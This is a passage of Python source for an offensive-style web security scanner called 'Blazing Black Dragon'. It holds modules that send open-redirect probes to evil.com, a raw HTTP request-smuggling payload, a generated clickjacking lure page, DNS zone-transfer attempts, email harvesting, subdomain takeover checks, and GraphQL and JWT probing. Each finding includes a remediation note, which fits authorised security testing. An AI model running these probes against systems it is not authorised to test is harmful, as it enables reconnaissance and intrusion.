                                component=p["url"],
                                evidence=f"Location: {loc}",
                                fix="Validate redirect targets against a strict whitelist.",
                                refs=["https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"],
                                cves=["CWE-601"],module="VulnTester-OpenRedirect"
                            ))
                            break

        # Probe common redirect params in URL
        for rp in REDIRECT_PARAMS[:10]:
            r = self._probe_url_with_payload(self.url, rp, "https://evil.com")
            if r and r.status_code in (301,302,303,307,308):
                loc = r.headers.get("Location","")
                if "evil.com" in loc:
                    self.report.add(Vuln(
                        name=f"Open Redirect via URL parameter '{rp}'",
                        severity="Medium",
                        desc="Application redirects to external attacker-controlled URL.",
                        component=self.url, evidence=f"?{rp}=https://evil.com → {loc}",
                        fix="Whitelist allowed redirect destinations.",
                        module="VulnTester-OpenRedirect"
                    ))

    # ── CSRF Analysis ─────────────────────────────────────────────────────────
    def csrf_analysis(self):
        _status("CSRF token analysis")
        if not BS4_OK: return
        r = self.sess.get(self.url)
        if not r or not r.text: return
        soup  = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        for form in forms:
            method = form.get("method","get").lower()
            if method != "post": continue
            action = form.get("action","")
            inputs = {i.get("name","").lower() for i in form.find_all("input")}
            csrf_tokens = {"csrf","_token","csrf_token","csrfmiddlewaretoken",
                           "authenticity_token","__requestverificationtoken",
                           "xsrf","_csrf_token","form_token"}
            has_csrf = bool(inputs & csrf_tokens)
            if not has_csrf:
                self.report.add(Vuln(
                    name=f"CSRF: POST form missing anti-CSRF token (action={action or '/'})",
                    severity="Medium",
                    desc="This POST form lacks a CSRF token. Attacker can trick "
                         "authenticated users into submitting the form cross-origin.",
                    component=urljoin(self.url, action) if action else self.url,
                    evidence=f"Form inputs: {list(inputs)[:8]}",
                    fix="Implement synchronizer token or SameSite cookie defence.",
                    refs=["https://owasp.org/www-community/attacks/csrf"],
                    cves=["CWE-352"],module="VulnTester-CSRF"
                ))

    # ── HTTP Request Smuggling ────────────────────────────────────────────────
    def request_smuggling_test(self):
        _status("HTTP request smuggling probe")
        if not self.url.startswith("https://"): return
        host = urlparse(self.url).hostname
        try:
            import socket as _s
            ctx = ssl.create_default_context()
            ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            with _s.create_connection((host, 443), timeout=6) as raw:
                with ctx.wrap_socket(raw, server_hostname=host) as tls:
                    payload = (
                        f"POST / HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: 6\r\n"
                        f"Transfer-Encoding: chunked\r\n\r\n"
                        f"0\r\n\r\nX"
                    )
                    tls.sendall(payload.encode())
                    resp = tls.recv(1024).decode(errors="ignore")
                    if "400" not in resp and len(resp) > 0:
                        self.report.add(Vuln(
                            name="Possible HTTP Request Smuggling (CL.TE probe did not receive 400)",
                            severity="High",
                            desc="Conflicting CL+TE headers were not rejected. May indicate "
                                 "a desync vulnerability between frontend and backend.",
                            component=self.url,
                            evidence=f"Server response: {resp[:200]}",
                            fix="Ensure frontend and backend agree on request parsing. "
                                "Use HTTP/2 end-to-end where possible.",
                            refs=["https://portswigger.net/web-security/request-smuggling"],
                            cves=["CWE-444"],module="VulnTester-Smuggling"
                        ))
        except Exception: pass

    # ── Clickjacking PoC ─────────────────────────────────────────────────────
    def clickjacking_poc(self, output_dir):
        poc = f"""<!DOCTYPE html>
<html><head><title>Clickjacking PoC — {html_module.escape(self.url)}</title>
<style>body{{margin:0;background:#111;color:#ff4444;font-family:monospace;}}
#wrap{{position:relative;width:100%;height:600px;}}
iframe{{opacity:0.5;position:absolute;top:0;left:0;width:100%;height:600px;border:0;}}
#overlay{{position:absolute;top:200px;left:50%;transform:translateX(-50%);
background:red;color:#fff;padding:20px;font-size:18px;cursor:pointer;z-index:10;}}</style>
</head><body>
<h2>🐉 Blazing Black Dragon — Clickjacking PoC</h2>
<p>Target: {html_module.escape(self.url)}</p>
<div id="wrap">
  <iframe src="{html_module.escape(self.url)}"></iframe>
  <div id="overlay">⚡ CLICK HERE TO WIN A PRIZE ⚡</div>
</div>
</body></html>"""
        poc_path = Path(output_dir) / "clickjacking_poc.html"
        poc_path.write_text(poc, encoding="utf-8")
        print(f"  {C.YLW}[PoC]{C.R} Clickjacking PoC → {poc_path}")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: FORM & EMAIL HARVESTER
# ══════════════════════════════════════════════════════════════════════════════

class FormHarvester:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("Form surface & email harvesting")
        if not BS4_OK: return
        r = self.sess.get(self.url)
        if not r or not r.text: return
        soup  = BeautifulSoup(r.text, "html.parser")

        # Email harvesting
        emails = set(re.findall(
            r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", r.text))
        if emails:
            self.report.emails.update(emails)
            self.report.add(Vuln(
                name=f"Email addresses exposed in HTML ({len(emails)} found)",
                severity="Low",
                desc="Email addresses visible in page source enable targeted phishing/spear-phishing.",
                component=self.url,
                evidence=", ".join(list(emails)[:5]),
                fix="Obfuscate email addresses or use contact forms.",
                module="FormHarvester"
            ))

        # Form analysis
        forms = soup.find_all("form")
        self.report.info["forms_found"] = len(forms)
        for form in forms:
            method = form.get("method","get").upper()
            action = form.get("action","")
            inputs = [(i.get("name",""),i.get("type","text")) for i in form.find_all("input")]
            form_data = {"action":action,"method":method,"inputs":inputs}
            self.report.forms.append(form_data)

            # Login form detection
            input_types = [i[1].lower() for i in inputs]
            input_names = [i[0].lower() for i in inputs]
            if "password" in input_types:
                action_url = urljoin(self.url, action) if action else self.url
                # Check if login is over HTTP
                if action_url.startswith("http://"):
                    self.report.add(Vuln(
                        name="Login form submits credentials over HTTP", severity="Critical",
                        desc="Credentials will be transmitted in plaintext.",
                        component=action_url,
                        fix="Use HTTPS for all pages handling credentials.",
                        module="FormHarvester"
                    ))
                # Autocomplete on password field
                for inp in form.find_all("input", type=re.compile("password",re.I)):
                    if inp.get("autocomplete","").lower() != "off":
                        self.report.add(Vuln(
                            name="Password field has autocomplete enabled", severity="Low",
                            desc="Browser may cache password in autocomplete history.",
                            component=action_url,
                            fix="Add autocomplete='off' to password input fields.",
                            module="FormHarvester"
                        ))

            # File upload form
            if "file" in input_types:
                action_url = urljoin(self.url, action) if action else self.url
                self.report.add(Vuln(
                    name="File upload form detected", severity="Medium",
                    desc="File upload functionality is a high-risk feature that may allow "
                         "malicious file upload if not properly validated.",
                    component=action_url,
                    fix="Validate file type, magic bytes, and size. Store outside webroot. "
                        "Scan uploads with antivirus.",
                    refs=["https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"],
                    module="FormHarvester"
                ))

        # Link harvesting
        links = set()
        for a in soup.find_all("a", href=True):
            href = a["href"]
            full = urljoin(self.url, href)
            if urlparse(full).netloc == urlparse(self.url).netloc:
                links.add(full)
        self.report.links_found = list(links)[:100]
        self.report.info["internal_links"] = len(links)


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: GRAPHQL INTROSPECTION
# ══════════════════════════════════════════════════════════════════════════════

class GraphQLTester:
    ENDPOINTS = ["/graphql","/api/graphql","/v1/graphql","/gql",
                 "/query","/graphiql","/playground"]

    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("GraphQL introspection test")
        introspection_query = '{"query":"{__schema{queryType{name}}}"}'
        for ep in self.ENDPOINTS:
            target = self.url.rstrip("/") + ep
            r = self.sess.post(target,
                               data=introspection_query,
                               headers={"Content-Type":"application/json"},
                               allow_redirects=False)
            if r and r.status_code == 200:
                try:
                    j = r.json()
                    if "data" in j and "__schema" in str(j):
                        self.report.add(Vuln(
                            name=f"GraphQL introspection enabled at {ep}", severity="Medium",
                            desc="GraphQL introspection exposes the full API schema to attackers, "
                                 "enabling targeted query crafting and information disclosure.",
                            component=target,
                            evidence=str(j)[:300],
                            fix="Disable introspection in production environments.",
                            refs=["https://owasp.org/www-project-web-security-testing-guide/"],
                            module="GraphQLTester"
                        ))
                        # Probe for batch query abuse
                        batch_query = ('[{"query":"{__typename}"},{"query":"{__typename}"},'
                                       '{"query":"{__typename}"},{"query":"{__typename}"},'
                                       '{"query":"{__typename}"},{"query":"{__typename}"},'
                                       '{"query":"{__typename}"},{"query":"{__typename}"}]')
                        rb = self.sess.post(target, data=batch_query,
                                            headers={"Content-Type":"application/json"})
                        if rb and rb.status_code == 200 and isinstance(rb.json(), list):
                            self.report.add(Vuln(
                                name="GraphQL batching enabled (DoS / brute-force risk)",
                                severity="Medium",
                                desc="GraphQL accepts batched queries, enabling brute-force "
                                     "and query flood attacks.",
                                component=target,
                                fix="Limit query complexity and disable batching.",
                                module="GraphQLTester"
                            ))
                except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: DNS — ZONE TRANSFER + SPF/DMARC/DKIM
# ══════════════════════════════════════════════════════════════════════════════

class DNSAnalyser:
    def __init__(self, url, report: Report):
        self.url    = url
        self.report = report
        self.domain = urlparse(url).hostname or url
        # Strip to base domain
        parts = self.domain.split(".")
        self.base_domain = ".".join(parts[-2:]) if len(parts) >= 2 else self.domain

    def run(self):
        _status("DNS analysis (zone transfer + SPF/DMARC/DKIM)")
        if not DNS_OK:
            log.debug("dnspython not available for DNS analysis")
            return

        # Zone transfer attempt
        try:
            ns_records = [str(r) for r in dns.resolver.resolve(self.base_domain, "NS")]
            self.report.info["dns_ns"] = ns_records
            for ns in ns_records:
                try:
                    z = dns.zone.from_xfr(dns.query.xfr(ns.rstrip("."), self.base_domain,
                                                          lifetime=5))
                    names = list(z.nodes.keys())
                    self.report.add(Vuln(
                        name=f"DNS Zone Transfer allowed from {ns}",
                        severity="Critical",
                        desc=f"NS server {ns} allowed AXFR zone transfer, exposing all DNS records "
                             f"({len(names)} names). Attackers can map the entire network.",
                        component=self.base_domain,
                        evidence=f"Names: {[str(n) for n in names[:15]]}",
                        fix="Restrict zone transfers to authorised secondary nameservers only.",
                        refs=["https://owasp.org/www-project-web-security-testing-guide/"],
                        module="DNSAnalyser"
                    ))
                except Exception: pass
        except Exception: pass

        # SPF record check
        try:
            spf_records = []
            for txt in dns.resolver.resolve(self.base_domain, "TXT"):
                val = str(txt).strip('"')
                if val.startswith("v=spf1"):
                    spf_records.append(val)
            if not spf_records:
                self.report.add(Vuln(
                    name="No SPF record found", severity="Medium",
                    desc="Missing SPF record allows anyone to spoof email from this domain.",
                    component=self.base_domain,
                    fix=f"Add TXT record: v=spf1 include:yourmailprovider.com ~all",
                    refs=["https://www.dmarcanalyzer.com/spf/"],
                    module="DNSAnalyser"
                ))
            else:
                for spf in spf_records:
                    if spf.endswith("+all") or spf.endswith(" +all"):
                        self.report.add(Vuln(
                            name="SPF record uses +all (allows any sender)", severity="High",
                            desc="'+all' allows any mail server to send mail as this domain.",
                            component=self.base_domain, evidence=spf,
                            fix="Change +all to ~all or -all.",
                            module="DNSAnalyser"
                        ))
                self.report.info["spf"] = spf_records[0]
        except Exception: pass

        # DMARC check
        try:
            dmarc = []
            for txt in dns.resolver.resolve(f"_dmarc.{self.base_domain}", "TXT"):
                dmarc.append(str(txt).strip('"'))
            if not dmarc:
                self.report.add(Vuln(
                    name="No DMARC record found", severity="Medium",
                    desc="Missing DMARC allows email spoofing to bypass spam filters.",
                    component=self.base_domain,
                    fix="Add _dmarc TXT record: v=DMARC1; p=reject; rua=mailto:dmarc@yourdomain.com",
                    refs=["https://dmarc.org/"],module="DNSAnalyser"
                ))
            else:
                for d in dmarc:
                    if "p=none" in d:
                        self.report.add(Vuln(
                            name="DMARC policy is 'none' (monitoring only, no enforcement)",
                            severity="Low",
                            desc="DMARC p=none means no enforcement — spoofed emails still deliver.",
                            component=self.base_domain, evidence=d,
                            fix="Upgrade DMARC policy to p=quarantine or p=reject.",
                            module="DNSAnalyser"
                        ))
                self.report.info["dmarc"] = dmarc[0]
        except Exception: pass

        # MX records
        try:
            mx_records = [str(r.exchange) for r in dns.resolver.resolve(self.base_domain,"MX")]
            self.report.info["dns_mx"] = mx_records
        except Exception: pass

        # Subdomain takeover detection (common cloud provider patterns)
        self._subdomain_takeover_check()

    def _subdomain_takeover_check(self):
        """Check for dangling CNAME records pointing to unclaimed cloud services."""
        takeover_signatures = {
            "s3.amazonaws.com":         "AWS S3 bucket takeover",
            "azurewebsites.net":        "Azure Web App takeover",
            "github.io":                "GitHub Pages takeover",
            "netlify.app":              "Netlify takeover",
            "heroku.com":               "Heroku app takeover",
            "firebaseapp.com":          "Firebase takeover",
            "surge.sh":                 "Surge.sh takeover",
            "readthedocs.io":           "ReadTheDocs takeover",
            "helpscoutdocs.com":        "HelpScout takeover",
        }
        for sub in SUBDOMAINS[:20]:
            fqdn = f"{sub}.{self.base_domain}"
            try:
                cname = str(dns.resolver.resolve(fqdn, "CNAME")[0].target)
                for sig, name in takeover_signatures.items():
                    if sig in cname:
                        # Check if unclaimed
                        r = requests.get(f"https://{fqdn}", timeout=4,
                                         verify=False, allow_redirects=False)
                        if r.status_code in (404, 410):
                            self.report.add(Vuln(
                                name=f"Potential subdomain takeover: {fqdn} → {cname}",
                                severity="High",
                                desc=f"CNAME points to {cname} which returns {r.status_code}. "
                                     "This may be claimable by an attacker.",
                                component=fqdn, evidence=f"CNAME: {cname}",
                                fix="Remove dangling DNS record or reclaim the cloud resource.",
                                refs=["https://hackerone.com/reports/145"],
                                module="DNSAnalyser"
                            ))
            except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: OAUTH / JWT MISCONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════

class OAuthJWTAnalyser:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("OAuth / JWT misconfiguration check")
        # OAuth discovery endpoints
        oidc_endpoints = [
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
            "/oauth/.well-known/openid-configuration",
            "/auth/realms/master/.well-known/openid-configuration",
        ]
        for ep in oidc_endpoints:
            r = self.sess.get(self.url.rstrip("/")+ep)
            if r and r.status_code == 200:
                try:
                    cfg = r.json()
                    self.report.info["oauth_config"] = ep
                    # Check for implicit flow enabled
                    grant_types = cfg.get("grant_types_supported",[])
                    if "implicit" in grant_types or "token" in grant_types:
                        self.report.add(Vuln(
                            name="OAuth Implicit Flow enabled (deprecated)", severity="Medium",
                            desc="OAuth implicit flow is deprecated and vulnerable to token leakage.",
                            component=self.url.rstrip("/")+ep,
                            fix="Use Authorization Code Flow with PKCE instead.",
                            refs=["https://tools.ietf.org/html/draft-ietf-oauth-security-topics"],
                            module="OAuthJWTAnalyser"
                        ))
                    # jwks_uri check
                    jwks_uri = cfg.get("jwks_uri","")
                    if jwks_uri:
                        rj = self.sess.get(jwks_uri)
                        if rj and rj.status_code == 200:
                            self.report.add(Vuln(
                                name="JWKS endpoint publicly accessible", severity="Info",
                                desc="JWT signing keys publicly available. "
                                     "Verify only public keys are listed.",
                                component=jwks_uri,module="OAuthJWTAnalyser"
                            ))
                except Exception: pass

        # Check for JWT with 'none' algorithm (scan cookies + auth headers from responses)
        r = self.sess.get(self.url)
        if r:
            for ck in r.cookies:
                val = ck.value
                if val.startswith("eyJ"):
                    try:
                        header_b64 = val.split(".")[0]
                        header_b64 += "=" * (-len(header_b64) % 4)
                        header = json.loads(base64.b64decode(header_b64))
                        alg = header.get("alg","")
                        if alg.lower() == "none":
                            self.report.add(Vuln(
                                name=f"JWT with 'none' algorithm in cookie '{ck.name}'",
                                severity="Critical",
                                desc="JWT 'none' algorithm means no signature verification. "
                                     "Any attacker can forge arbitrary tokens.",
                                component=self.url, evidence=f"alg: {alg}",
                                fix="Always verify JWT signatures. Reject 'none' algorithm.",
                                refs=["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"],
                                module="OAuthJWTAnalyser"
                            ))
                        if alg.upper() in ("HS256","HS384","HS512"):
                            self.report.add(Vuln(
                                name=f"JWT uses symmetric HMAC in cookie '{ck.name}'",
                                severity="Info",
                                desc=f"HMAC-based JWT ({alg}). Ensure secret is strong and rotated.",
                                component=self.url,
                                fix="Use RS256/ES256 (asymmetric) for distributed systems.",
                                module="OAuthJWTAnalyser"
                            ))
                    except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: SUBDOMAIN ENUMERATION
# ══════════════════════════════════════════════════════════════════════════════

class SubdomainEnum:
    def __init__(self, url, report: Report):
        self.url    = url
        self.report = report
        self.domain = urlparse(url).hostname or url
        parts = self.domain.split(".")
        self.base_domain = ".".join(parts[-2:]) if len(parts) >= 2 else self.domain

    def run(self):
        _status("Subdomain enumeration")
        found = []
        def resolve(sub):
            fqdn = f"{sub}.{self.base_domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                return (fqdn, ip)
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
            for res in ex.map(resolve, SUBDOMAINS):
                if res:
                    fqdn, ip = res
                    found.append(fqdn)
                    self.report.subdomains.append({"host":fqdn,"ip":ip})
                    self.report.add(Vuln(
                        name=f"Subdomain discovered: {fqdn} ({ip})",
                        severity="Info",
                        desc="Active subdomain. Verify each for misconfigurations.",
                        component=fqdn, evidence=f"Resolved to {ip}",
                        fix="Ensure all subdomains are secured and monitored.",
                        module="SubdomainEnum"
                    ))

        if found:
            self.report.info["subdomains_found"] = len(found)
            print(f"    {C.GRN}[+]{C.R} {len(found)} subdomains found: "
                  f"{', '.join(found[:5])}{'…' if len(found)>5 else ''}")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: EXTERNAL TOOL INTEGRATIONS (nikto, nuclei)
# ══════════════════════════════════════════════════════════════════════════════

class ExternalTools:
    def __init__(self, url, report: Report, output_dir: Path):
        self.url = url; self.report = report; self.output_dir = output_dir

    def run(self):
        self._nikto()
        self._nuclei()

    def _nikto(self):
        if not shutil.which("nikto"): return
        _status("Running Nikto scan")
        out_file = str(self.output_dir / "nikto_output.txt")
        try:
            result = subprocess.run(
                ["nikto","-h",self.url,"-nointeractive","-output",out_file,
                 "-Format","txt"],
                capture_output=True, text=True, timeout=120
            )
            output = result.stdout + result.stderr
            # Parse nikto findings
            for line in output.splitlines():
                if "OSVDB" in line or "+ " in line:
                    sev = "Medium" if "OSVDB" in line else "Low"
                    self.report.add(Vuln(
                        name=f"Nikto: {line[:120]}", severity=sev,
                        desc=f"Finding from nikto web scanner: {line}",
                        component=self.url,
                        fix="Refer to nikto documentation for remediation.",
                        module="Nikto"
                    ))
            print(f"  {C.GRN}[nikto]{C.R} Scan complete → {out_file}")
        except subprocess.TimeoutExpired:
            self.report.err("Nikto timed out after 120s")
        except Exception as e:
            self.report.err(f"Nikto error: {e}")

    def _nuclei(self):
        if not shutil.which("nuclei"): return
        _status("Running Nuclei scan (critical/high templates)")
        out_file = str(self.output_dir / "nuclei_output.txt")
        try:
            result = subprocess.run(
                ["nuclei","-u",self.url,"-severity","critical,high,medium",
                 "-silent","-o",out_file,"-timeout","5"],
                capture_output=True, text=True, timeout=180
            )
            output = result.stdout
            for line in output.splitlines():
                if not line.strip(): continue
                sev = "High"
                if "critical" in line.lower(): sev = "Critical"
                elif "medium"  in line.lower(): sev = "Medium"
                self.report.add(Vuln(
                    name=f"Nuclei: {line[:150]}", severity=sev,
                    desc=f"Finding from nuclei template scanner: {line}",
                    component=self.url,module="Nuclei"
                ))
            print(f"  {C.GRN}[nuclei]{C.R} Scan complete → {out_file}")
        except subprocess.TimeoutExpired:
            self.report.err("Nuclei timed out after 180s")
        except Exception as e:
            self.report.err(f"Nuclei error: {e}")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: CUSTOM QUERY SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class CustomQueryScanner:
    """
    Interprets the user's natural-language scan queries and performs
    targeted searches for those patterns across the target.
    """
    KEYWORD_MAP = {
        # Headers
        "header": "headers", "security header": "headers", "hsts": "headers",
        "csp": "headers", "x-frame": "headers", "clickjack": "headers",
        # Injection
        "sql": "sqli", "injection": "sqli", "sqli": "sqli", "database error": "sqli",
        "xss": "xss", "cross-site scripting": "xss", "script injection": "xss",
        "command injection": "cmdi", "os injection": "cmdi", "rce": "cmdi",
        "ssti": "ssti", "template injection": "ssti", "server-side template": "ssti",
        "lfi": "lfi", "path traversal": "lfi", "directory traversal": "lfi",
        "file inclusion": "lfi", "local file": "lfi",
        # Auth / session
        "csrf": "csrf", "cross-site request": "csrf",
        "session": "session", "cookie": "session", "token": "session",
        "open redirect": "redirect", "redirect": "redirect",
        "authentication": "auth", "login": "auth", "brute": "auth",
        # Crypto
        "ssl": "ssl", "tls": "ssl", "certificate": "ssl", "https": "ssl",
        "weak cipher": "ssl", "expired cert": "ssl",
        # Disclosure
        "secret": "secrets", "api key": "secrets", "password": "secrets",
        "credential": "secrets", "token exposed": "secrets", "hardcoded": "secrets",
        "sensitive file": "dirtraversal", "exposed file": "dirtraversal",
        "directory listing": "dirtraversal", "backup": "dirtraversal",
        # Network
        "port": "ports", "open port": "ports", "service": "ports",
        "subdomain": "subs", "dns": "dns", "zone transfer": "dns",
        "spf": "dns", "dmarc": "dns",
        # Modern / API
        "graphql": "graphql", "api": "api", "rest": "api", "oauth": "oauth",
        "jwt": "oauth", "cors": "cors",
        # Generic
        "vulnerability": "all", "all": "all", "everything": "all",
        "comprehensive": "all", "full scan": "all",
    }

    def __init__(self, url, sess: Session, report: Report, queries: List[str]):
        self.url = url; self.sess = sess; self.report = report
        self.queries = queries
        self.tags: Set[str] = set()
        self._parse_queries()

    def _parse_queries(self):
        for q in self.queries:
            q_low = q.lower()
            for kw, tag in self.KEYWORD_MAP.items():
                if kw in q_low:
                    self.tags.add(tag)
        if not self.tags:
            self.tags.add("all")

    def run(self):
        if not self.queries: return
        print(f"\n  {C.FIRE}🔥 Executing custom scan queries:{C.R}")
        for q in self.queries:
            print(f"     {C.CYN}▸{C.R} {q}")
        print(f"  {C.B}Tags resolved:{C.R} {', '.join(sorted(self.tags))}\n")

        # Run targeted modules based on parsed tags
        vt = VulnTester(self.url, self.sess, self.report)

        tag_action = {
            "headers":      lambda: HeadersAnalyser(self.url, self.sess, self.report).run(),
            "ssl":          lambda: SSLAnalyser(self.url, self.report).run(),
            "sqli":         vt.sqli_test,
            "xss":          vt.xss_test,
            "ssti":         vt.ssti_test,
            "lfi":          vt.lfi_test,
            "cmdi":         vt.cmd_injection_test,
            "redirect":     vt.open_redirect_test,
            "csrf":         vt.csrf_analysis,
            "secrets":      lambda: JSScanner(self.url, self.sess, self.report).run(),
            "cors":         lambda: CORSChecker(self.url, self.sess, self.report).run(),
            "dirtraversal": lambda: DirEnum(self.url, self.sess, self.report).run(),
            "ports":        lambda: PortScanner(
                                urlparse(self.url).hostname or self.url,
                                self.report).scan(),
            "dns":          lambda: DNSAnalyser(self.url, self.report).run(),
            "graphql":      lambda: GraphQLTester(self.url, self.sess, self.report).run(),
            "oauth":        lambda: OAuthJWTAnalyser(self.url, self.sess, self.report).run(),
            "subs":         lambda: SubdomainEnum(self.url, self.report).run(),
            "session":      lambda: HeadersAnalyser(self.url, self.sess, self.report).run(),
            "auth":         lambda: FormHarvester(self.url, self.sess, self.report).run(),
            "api":          lambda: GraphQLTester(self.url, self.sess, self.report).run(),
        }

        if "all" in self.tags:
            for fn in tag_action.values():
                try: fn()
                except Exception: pass
        else:
            for tag in self.tags:
                if tag in tag_action:
                    try:
                        _status(f"Custom query — running {tag} module")
                        tag_action[tag]()
                    except Exception: pass

        # Also do a raw string search across the page body
        self._raw_string_search()

    def _raw_string_search(self):
        """Search for exact strings from user queries in the page source."""
        r = self.sess.get(self.url)
        if not r or not r.text: return
        for q in self.queries:
            # Look for specific patterns the user mentioned
            q_stripped = q.strip()
            if len(q_stripped) > 4:
                if q_stripped.lower() in r.text.lower():
                    self.report.add(Vuln(
                        name=f"Custom query match: '{q_stripped[:60]}' found in response",
                        severity="Medium",
                        desc=f"User-specified pattern '{q_stripped[:80]}' was found in "
                             "the page response body.",
                        component=self.url,
                        evidence=f"Pattern '{q_stripped[:60]}' present in HTTP response",
                        fix="Review the context in which this pattern appears.",
                        module="CustomQuery"
                    ))


# ══════════════════════════════════════════════════════════════════════════════
# REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

class ReportGen:
    DRAGON_BANNER = r"""
{RED}{B}
  ████████╗██╗  ██╗███████╗    ██████╗ ██╗      █████╗ ███████╗██╗███╗   ██╗ ██████╗
  ╚══██╔══╝██║  ██║██╔════╝    ██╔══██╗██║     ██╔══██╗╚══███╔╝██║████╗  ██║██╔════╝
     ██║   ███████║█████╗      ██████╔╝██║     ███████║  ███╔╝ ██║██╔██╗ ██║██║  ███╗
     ██║   ██╔══██║██╔══╝      ██╔══██╗██║     ██╔══██║ ███╔╝  ██║██║╚██╗██║██║   ██║
     ██║   ██║  ██║███████╗    ██████╔╝███████╗██║  ██║███████╗██║██║ ╚████║╚██████╔╝
     ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝

{ORG}  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗
  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║
  ██████╔╝██║     ███████║██║     █████╔╝     ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║
  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║
  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║
  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
{R}
{YLW}  ╔════════════════════════════════════════════════════════════════════════╗
  ║    🔥  WITH  FIERY  BREATH  —  v{VERSION}  —  Professional  WebSec  Engine  🔥   ║
  ╚════════════════════════════════════════════════════════════════════════╝{R}
"""

    def __init__(self, report: Report):
        self.report = report

    def _banner(self):
        banner = self.DRAGON_BANNER
        banner = banner.replace("{RED}",  C.RED).replace("{B}",   C.B)
        banner = banner.replace("{ORG}",  C.ORG).replace("{YLW}", C.YLW)
        banner = banner.replace("{R}",    C.R)
        banner = banner.replace("{VERSION}", VERSION)
        print(banner)

    def print_terminal(self):
        r    = self.report
        stat = r.stats()
        print(f"\n{C.FIRE}{'━'*76}{C.R}")
        print(f"  {C.B}🐉 BLAZING BLACK DRAGON — SCAN COMPLETE{C.R}")
        print(f"{'━'*76}")
        print(f"  {C.B}Target :{C.R} {r.url}  [{r.ip}]")
        print(f"  {C.B}Duration:{C.R} {r.duration()}  |  "
              f"{C.B}Vulns:{C.R} {len(r.vulns)}  |  "
              f"{C.B}Ports:{C.R} {len(r.ports)}")
        if r.waf: print(f"  {C.B}WAF/CDN:{C.R} {r.waf}")
        if r.subdomains: print(f"  {C.B}Subdomains:{C.R} {len(r.subdomains)}")
        print(f"\n  {C.B}Severity summary:{C.R}")
        sev_colors = {"Critical":C.RED+C.B,"High":C.RED,"Medium":C.YLW,
                      "Low":C.CYN,"Info":C.GRY}
        for sev,count in stat.items():
            if count:
                bar = "█" * min(count, 40)
                print(f"    {sev_colors[sev]}{sev:10}{C.R}  {bar}  {count}")
        print(f"\n{'━'*76}")

        # Group by module
        by_module: Dict[str,List[Vuln]] = {}
        for v in r.vulns:
            by_module.setdefault(v.module or "General",[]).append(v)

        for module, vulns in sorted(by_module.items(),
                                     key=lambda x: SEV_ORDER.get(x[1][0].severity,99)):
            print(f"\n  {C.MAG}{C.B}[{module}]{C.R}")
            for v in vulns:
                sc = C.sev(v.severity)
                print(f"    {sc}{v.severity:10}{C.R}  {v.name}")
                if v.evidence:
                    print(f"              {C.GRY}↳ {v.evidence[:90]}{C.R}")

        if r._errors:
            print(f"\n  {C.YLW}Module errors ({len(r._errors)}):{C.R}")
            for e in r._errors[:5]:
                print(f"    {C.GRY}• {e}{C.R}")
        print(f"\n{'━'*76}\n")

    def save_json(self, path: str):
        r = self.report
        data = {
            "tool": TOOL_NAME, "version": VERSION,
            "target": r.url, "ip": r.ip,
            "scan_start": r.start.isoformat(),
            "scan_end":   r.end.isoformat() if r.end else None,
            "duration":   r.duration(),
            "waf":        r.waf,
            "info":       r.info,
            "stats":      r.stats(),
            "ports":      r.ports,
            "subdomains": r.subdomains,
            "emails":     list(r.emails),
            "forms":      r.forms,
            "vulns":      [v.to_dict() for v in r.vulns],
            "errors":     r._errors,
        }
        with open(path,"w",encoding="utf-8") as f:
            json.dump(data, f, indent=2, default=str)
        print(f"{C.GRN}[+]{C.R} JSON  → {path}")

    def save_html(self, path: str):
        r    = self.report
        stat = r.stats()
        sev_css = {"Critical":"#ff2222","High":"#ff6622","Medium":"#ffcc00",
                   "Low":"#00ccff","Info":"#888888"}
        rows = ""
        for v in r.vulns:
            sc = sev_css.get(v.severity,"#fff")
            refs_html = "".join(f'<a href="{html_module.escape(ref)}" target="_blank">[ref]</a> '
                                for ref in v.refs)
            rows += f"""<tr>
              <td style="color:{sc};font-weight:bold">{html_module.escape(v.severity)}</td>
              <td>{html_module.escape(v.name)}</td>
              <td>{html_module.escape(v.component)}</td>
              <td><small>{html_module.escape(v.fix)}</small></td>
